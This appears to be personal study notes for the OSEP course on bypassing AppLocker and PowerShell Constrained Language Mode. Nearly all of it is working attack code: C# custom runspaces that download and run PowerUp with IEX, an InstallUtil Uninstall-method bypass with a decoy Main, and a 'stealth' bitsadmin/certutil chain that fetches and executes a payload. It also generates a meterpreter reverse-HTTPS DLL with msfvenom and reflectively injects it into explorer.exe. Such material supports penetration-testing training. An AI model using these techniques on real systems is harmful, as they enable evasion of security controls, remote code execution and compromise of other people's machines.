# Bypassing AppLocker with PowerShell

## Constrained Language Mode

```powershell
# Find the language mode of the current PowerShell session
$ExecutionContext.SessionState.LanguageMode

```

## Custom Runspaces

Located at `/home/kali/data/OSEP/CustomRunspace/`

Visual Studio can not locate _System.Management.Automation.Runspaces_, to resolve this. Right-click the References folder in the Solution Explorer and select _Add Reference._ To do this, we'll select the _Browse..._ button at the bottom of the window and navigate to the C:\Windows\assembly\GAC\_MSIL\System.Management.Automation\1.0.0.0\_\_31bf3856ad364e35 folder where we will select System.Management.Automation.dll

{% code overflow="wrap" %}
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CustomRunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```
{% endcode %}

**Script to fetch and execute PowerUp in a custom runspace**

{% code overflow="wrap" %}
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CustomRunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```
{% endcode %}

## PowerShell CLM Bypass

**Located at** `/home/kali/data/OSEP/PowerShellCLMBypass/`

**Run with**&#x20;

{% code overflow="wrap" %}
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
```
{% endcode %}

Or more stealth

{% code overflow="wrap" %}
```powershell
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```
{% endcode %}

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace PowerShellCLMBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
			Runspace rs = RunspaceFactory.CreateRunspace();
			rs.Open();

			PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;

			ps.AddScript(cmd);
			ps.Invoke();
			rs.Close();
		}
	}
}
```

## Reflective Injection Returns

Located at `/home/kali/data/OSEP/ReflectiveInjectionReturns/`

Get around blocked DLLs

{% code overflow="wrap" %}
```bash
# Generate meterpreter DLL
sudo msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.49.72 lport=443 -f dll -o /home/kali/share/met.dll
```
{% endcode %}

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace ReflectiveInjectionReturns
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
			Runspace rs = RunspaceFactory.CreateRunspace();
			rs.Open();

			PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;

			ps.AddScript(cmd);
			ps.Invoke();
			rs.Close();
		}
	}
}
```
